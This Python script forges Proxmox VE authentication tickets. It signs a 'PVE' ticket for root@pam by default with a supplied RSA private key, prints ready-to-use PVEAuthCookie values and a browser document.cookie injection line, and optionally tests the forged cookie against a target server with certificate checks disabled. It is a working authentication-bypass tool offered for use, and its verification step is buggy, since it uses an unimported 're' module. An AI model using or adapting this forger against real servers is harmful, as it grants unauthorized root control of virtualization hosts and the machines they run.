#!/usr/bin/env python3
# pip install cryptography

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
import base64
import time
import urllib.parse
import logging
import requests
import argparse

logging.basicConfig(format="%(asctime)s - %(message)s", level=logging.INFO)
PROXIES = {}


def assemble_rsa_ticket(rsa_priv, prefix, data, secret_data=None):
    timestamp = format(int(time.time()), '08X')
    plain = f"{prefix}:"
    
    #if data is not None:
    #    data = urllib.parse.quote(data, ':')
    #    plain += f"{data}:"
    plain += data + ":"

    plain += timestamp

    full = f"{plain}:{secret_data}" if secret_data is not None else plain

    # Sign the data using the private key
    
    signed_data = rsa_priv.sign(
        full.encode('utf-8'),
        padding.PKCS1v15(),
        hashes.SHA1()
    )

    # Encode the signed data with Base64
    ticket = plain + "::" + base64.b64encode(signed_data).decode('utf-8')
    return ticket

def get_private_key(file_path):
    with open(file_path, "rb") as key_file:
        private_key = serialization.load_pem_private_key(
            key_file.read(),
            password=None,
            backend=default_backend()
        )
    return private_key

def _parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-k", metavar="key", required=True, help="The private key file")
    parser.add_argument(
        "-g", metavar="generate_for", default="root@pam", help="Default: root@pam"
    )
    parser.add_argument(
        "-t",
        metavar="target_url",
        help="Please keep the trailing slash, example: https://10.8.0.1:8006/",
        required=False,
    )
    return parser.parse_args()


if __name__ == "__main__":
    arg = _parse_args()
    new_ticket = assemble_rsa_ticket(get_private_key(arg.k), "PVE", arg.g)
    logging.info(f"NewTicket: {new_ticket}")
    logging.info(f"Cookie: PVEAuthCookie={urllib.parse.quote_plus(new_ticket)}")
    logging.info(f"document.cookie = 'PVEAuthCookie={urllib.parse.quote_plus(new_ticket)}';")
    if arg.t:
        logging.info("veryfing ticket")
        req = requests.get(
	        arg.t,
	        headers={"Cookie": f"PVEAuthCookie={new_ticket}"},
	        proxies=PROXIES,
	        verify=False,
	    )
        logging.debug(req.text)
	    
        res = req.content.decode("utf-8")
        verify_re = re.compile("UserName: '(.*?)',\n\s+CSRFPreventionToken:")
        verify_result = verify_re.findall(res)
        if len(verify_result) < 1:
            logging.error("Failed in verification")
            exit(1)
        logging.info(f"current user: {verify_result[0]}")
        logging.info(f"Cookie: PVEAuthCookie={urllib.parse.quote_plus(new_ticket)}")